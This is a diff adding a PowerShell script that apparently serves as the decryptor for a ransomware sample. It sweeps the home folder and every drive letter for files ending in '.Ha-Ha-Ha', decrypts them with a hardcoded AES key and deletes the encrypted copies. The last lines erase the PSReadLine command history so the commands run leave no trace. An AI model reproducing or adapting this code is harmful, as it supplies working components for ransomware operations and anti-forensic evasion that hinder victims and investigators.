@@ -1,0 +1,179 @@
+function New-CryptographyKey() {  
+[CmdletBinding()]  
+ [OutputType([System.Security.SecureString])]  
+[OutputType([String], ParameterSetName='PlainText')]  
+Param([Parameter(Mandatory=$false, Position=1)]  
+    [ValidateSet('AES','DES','RC2','Rijndael','TripleDES')]  
+    [String]$Algorithm='AES',  
+    [Parameter(Mandatory=$false, Position=2)]  
+    [Int]$KeySize,  
+    [Parameter(ParameterSetName='PlainText')]  
+    [Switch]$AsPlainText)  
+    Process    {  
+        try        {  
+            $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm)  
+            if($PSBoundParameters.ContainsKey('KeySize')){  
+                $Crypto.KeySize = $KeySize             }  
+            $Crypto.GenerateKey()  
+            if($AsPlainText)            {  
+                return [System.Convert]::ToBase64String($Crypto.Key) }  
+            else            {  
+                return [System.Convert]::ToBase64String($Crypto.Key) | ConvertTo-SecureString -AsPlainText -Force            }        }  
+        catch        {            Write-Error $_         } } }  
+Function Unprotect-File {  
+[CmdletBinding(DefaultParameterSetName='SecureString')]  
+[OutputType([System.IO.FileInfo[]])]  
+Param(  
+    [Parameter(Mandatory=$true, Position=1, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]  
+    [Alias('PSPath','LiteralPath')]  
+    [string[]]$FileName,  
+    [Parameter(Mandatory=$false, Position=2, ValueFromPipelineByPropertyName=$true)]  
+    [ValidateSet('AES','DES','RC2','Rijndael','TripleDES')]  
+    [String]$Algorithm = 'AES',  
+    [Parameter(Mandatory=$true, Position=3, ValueFromPipelineByPropertyName=$true, ParameterSetName='SecureString')]  
+    [System.Security.SecureString]$Key,  
+    [Parameter(Mandatory=$true, Position=3, ParameterSetName='PlainText')]  
+    [String]$KeyAsPlainText,  
+    [Parameter(Mandatory=$false, Position=4, ValueFromPipelineByPropertyName=$true)]  
+    [System.Security.Cryptography.CipherMode]$CipherMode = 'CBC',  
+    [Parameter(Mandatory=$false, Position=5, ValueFromPipelineByPropertyName=$true)]  
+    [System.Security.Cryptography.PaddingMode]$PaddingMode = 'PKCS7',  
+    [Parameter(Mandatory=$false, Position=6)]  
+    [String]$Suffix, #Assigning default value in code due to it not processing ".$Algorithm" properly when Algorithm is ValueFromPipelineByPropertyName  
+    [Parameter()]  
+    [Switch]$RemoveSource)  
+    Process  {      try        {  
+            if($PSCmdlet.ParameterSetName -eq 'PlainText')  
+            {  $Key = $KeyAsPlainText | ConvertTo-SecureString -AsPlainText -Force    }  
+            $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Key)  
+            $EncryptionKey = [System.Convert]::FromBase64String([System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR))  
+            $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm)  
+            $Crypto.Mode = $CipherMode  
+            $Crypto.Padding = $PaddingMode  
+            $Crypto.KeySize = $EncryptionKey.Length*8  
+            $Crypto.Key = $EncryptionKey  
+        }       Catch       {        Write-Error $_ -ErrorAction Stop        }  
+        if(-not $PSBoundParameters.ContainsKey('Suffix'))  
+        {      $Suffix = ".$Algorithm"        }  
+        $Files = Get-Item -LiteralPath $FileName  
+        ForEach($File in $Files)  
+        {  
+            If(-not $File.Name.EndsWith($Suffix))  
+            {  Write-Error "$($File.FullName) does not have an extension of '$Suffix'."  
+                Continue         }  
+            $DestinationFile = $File.FullName -replace "$Suffix$"  
+            Try          {  
+                $FileStreamReader = New-Object System.IO.FileStream($File.FullName, [System.IO.FileMode]::Open)  
+                $FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::Create)  
+                [Byte[]]$LenIV = New-Object Byte[] 4  
+                $FileStreamReader.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null  
+                $FileStreamReader.Read($LenIV,  0, 3) | Out-Null  
+                [Int]$LIV = [System.BitConverter]::ToInt32($LenIV,  0)  
+                [Byte[]]$IV = New-Object Byte[] $LIV  
+                $FileStreamReader.Seek(4, [System.IO.SeekOrigin]::Begin) | Out-Null  
+                $FileStreamReader.Read($IV, 0, $LIV) | Out-Null  
+                $Crypto.IV = $IV  
+                $Transform = $Crypto.CreateDecryptor()  
+                $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)  
+                $FileStreamReader.CopyTo($CryptoStream)  
+                $CryptoStream.FlushFinalBlock()  
+                $CryptoStream.Close()  
+                $FileStreamReader.Close()  
+                $FileStreamWriter.Close()  
+                if($RemoveSource){Remove-Item $File.FullName}  
+                Get-Item $DestinationFile | Add-Member -MemberType NoteProperty -Name SourceFile -Value $File.FullName -PassThru  
+            }    Catch      {          Write-Error $_  
+                If($FileStreamWriter)   {  
+                    $FileStreamWriter.Close()  
+                    Remove-Item -LiteralPath $DestinationFile -Force  
+                }     Continue   }  Finally     {  
+                if($CryptoStream){$CryptoStream.Close()}  
+                if($FileStreamReader){$FileStreamReader.Close()}  
+                if($FileStreamWriter){$FileStreamWriter.Close()}  }    }    }}  
+
+
+
+$files = get-childitem $home -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem A: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem B: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem C: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem D: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem E: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem F: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem G: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem H: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem I: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem J: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem K: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem L: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem M: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem N: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem O: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem P: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem Q: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem R: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem S: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem T: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem U: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem V: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem W: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem X: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem Y: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+$files = get-childitem Z: -recurse -Include *.Ha-Ha-Ha | where {! $_.PSIsContainer}
+foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText HN9rnnI/msTPlpNnByAIkA== -Suffix '.Ha-Ha-Ha' -RemoveSource }
+
+del $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\*.*
+
+exit
